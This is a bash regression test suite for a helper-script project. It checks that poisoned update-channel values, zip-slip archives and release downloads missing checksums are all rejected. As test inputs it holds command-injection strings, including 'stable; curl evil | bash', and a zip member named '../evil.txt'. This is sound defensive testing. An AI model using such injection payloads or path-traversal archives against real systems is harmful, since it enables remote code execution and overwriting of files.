#!/usr/bin/env bash
# Behavioral / unit regression tests for security hardening.
set -uo pipefail

TEST_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${TEST_DIR}/../.." && pwd)"

# shellcheck source=../lib/assertions.sh
source "${TEST_DIR}/../lib/assertions.sh"
# shellcheck source=../lib/mocks.sh
source "${TEST_DIR}/../lib/mocks.sh"

setup_mock_bin
trap teardown_mock_bin EXIT

echo -e "${YELLOW}=== Behavioral tests: security hardening ===${NC}"

FAKE_CFG=$(mktemp -d)
export XDG_CONFIG_HOME="$FAKE_CFG"
mkdir -p "${FAKE_CFG}/millennium-helpers"
# Valid empty-ish config so load_user_config on source is quiet
printf '%s\n' '{}' > "${FAKE_CFG}/millennium-helpers/config.json"

# shellcheck source=../../scripts/common.sh
source "${REPO_ROOT}/scripts/common.sh"
# shellcheck source=../../scripts/lib/diag_install.sh
source "${REPO_ROOT}/scripts/lib/diag_install.sh"
# shellcheck source=../../scripts/lib/diag_release.sh
source "${REPO_ROOT}/scripts/lib/diag_release.sh"

# --- Channel allow-list (config poison must not export invalid channel) ---
printf '%s\n' '{"update_channel":"stable; evil","github_token":""}' > "${FAKE_CFG}/millennium-helpers/config.json"
unset CONFIG_UPDATE_CHANNEL
load_user_config
assert_equals "" "${CONFIG_UPDATE_CHANNEL:-}" "load_user_config ignores poisoned update_channel"

# --- require_update_channel ---
out=$(require_update_channel "stable" 2>&1)
rc=$?
assert_success "$rc" "require_update_channel accepts stable"
assert_equals "stable" "$(echo "$out" | tr -d '[:space:]')" "require_update_channel echoes stable"

out=$(require_update_channel 'stable;id' 2>&1)
rc=$?
assert_failure "$rc" "require_update_channel rejects injection payload"

# --- Schedule enable with env-poisoned channel fails closed ---
SCHEDULE_SH="${REPO_ROOT}/scripts/millennium-schedule.sh"
FAKE_HOME=$(mktemp -d)
export XDG_CONFIG_HOME="${FAKE_HOME}/.config"
mkdir -p "${XDG_CONFIG_HOME}/millennium-helpers"
printf '%s\n' '{"update_channel":"stable"}' > "${XDG_CONFIG_HOME}/millennium-helpers/config.json"
out=$(CONFIG_UPDATE_CHANNEL='stable; curl evil | bash' bash "$SCHEDULE_SH" enable --dry-run --cron 2>&1)
rc=$?
assert_failure "$rc" "schedule enable refuses poisoned CONFIG_UPDATE_CHANNEL env"
assert_contains "$out" "Invalid update channel" "schedule enable explains invalid channel"

# Valid channel embeds as allow-listed token only
out=$(bash "$SCHEDULE_SH" enable beta --dry-run --cron 2>&1)
rc=$?
assert_success "$rc" "schedule enable beta --dry-run --cron exits 0"
assert_contains "$out" "--channel beta" "cron dry-run embeds validated channel"
assert_not_contains "$out" "curl evil" "cron dry-run does not embed attacker payload"

# --- safe_extract_zip rejects zip-slip ---
ZIP_DIR=$(mktemp -d)
python3 - <<PY
import zipfile, os
zp = os.path.join("${ZIP_DIR}", "evil.zip")
with zipfile.ZipFile(zp, "w") as zf:
    zf.writestr("../evil.txt", "pwned")
    zf.writestr("ok/file.txt", "safe")
PY
EXTRACT=$(mktemp -d)
out=$(safe_extract_zip "${ZIP_DIR}/evil.zip" "$EXTRACT" 2>&1)
rc=$?
assert_failure "$rc" "safe_extract_zip rejects zip-slip member"
assert_contains "$out" "Refusing zip member" "safe_extract_zip explains rejection"

# Clean zip extracts
python3 - <<PY
import zipfile, os
zp = os.path.join("${ZIP_DIR}", "good.zip")
with zipfile.ZipFile(zp, "w") as zf:
    zf.writestr("ThemeRepo-abc/skin.json", "{}")
PY
out=$(safe_extract_zip "${ZIP_DIR}/good.zip" "$EXTRACT" 2>&1)
rc=$?
assert_success "$rc" "safe_extract_zip accepts normal archive"
assert_file_exists "${EXTRACT}/ThemeRepo-abc/skin.json" "safe_extract_zip extracts safe member"

# --- diag_release hard-fails missing SHA (non-main) ---
# Variables consumed inside sourced diag_release.sh helpers.
export HELPERS_REPO="bolens/millenium-helpers"
export HELPERS_TRACK="release"
export LATEST_RELEASE_TAG="v9.9.9"
export DIAG_RELEASE_WORKDIR=""
export DIAG_RELEASE_EXTRACT=""
# shellcheck disable=SC2016 # mock body is intentionally single-quoted; expands when curl mock runs
mock_cmd "curl" '
args="$*"
for a in $args; do
  case "$a" in
    *.sha256) exit 22 ;;
  esac
done
out=""
prev=""
for a in $args; do
  if [[ "$prev" == "-o" ]]; then out="$a"; fi
  prev="$a"
done
if [[ -n "$out" ]]; then
  echo mock > "$out"
  exit 0
fi
exit 0
'
out=$(diag_fetch_release_tarball 2>&1)
rc=$?
assert_failure "$rc" "diag_fetch_release_tarball fails closed without SHA sidecar"
assert_contains "$out" "SHA256" "diag_fetch_release_tarball mentions SHA256 on failure"
rm -f "${MOCK_BIN}/curl"

# --- upgrade --file without checksum fails ---
UPGRADE_SH="${REPO_ROOT}/scripts/millennium-upgrade.sh"
MOCK_FILE=$(mktemp)
echo data > "$MOCK_FILE"
out=$(bash "$UPGRADE_SH" --file "$MOCK_FILE" --dry-run 2>&1)
rc=$?
assert_failure "$rc" "millennium-upgrade --file without checksum fails"
assert_contains "$out" "--sha256" "millennium-upgrade --file explains checksum requirement"
rm -f "$MOCK_FILE"

# --- MCP Windows elevation builder uses EncodedCommand ---
MCP_PY="${REPO_ROOT}/scripts/millennium-mcp.py"
if grep -q 'EncodedCommand' "$MCP_PY"; then
  _report true "MCP uses EncodedCommand for Windows elevation"
else
  _report false "MCP uses EncodedCommand for Windows elevation"
fi
if grep -qF "ArgumentList '{ps_args}'" "$MCP_PY"; then
  _report false "MCP no longer uses ArgumentList single-quote interpolation"
else
  _report true "MCP no longer uses ArgumentList single-quote interpolation"
fi

rm -rf "$FAKE_CFG" "$FAKE_HOME" "$ZIP_DIR" "$EXTRACT" 2>/dev/null || true

print_summary
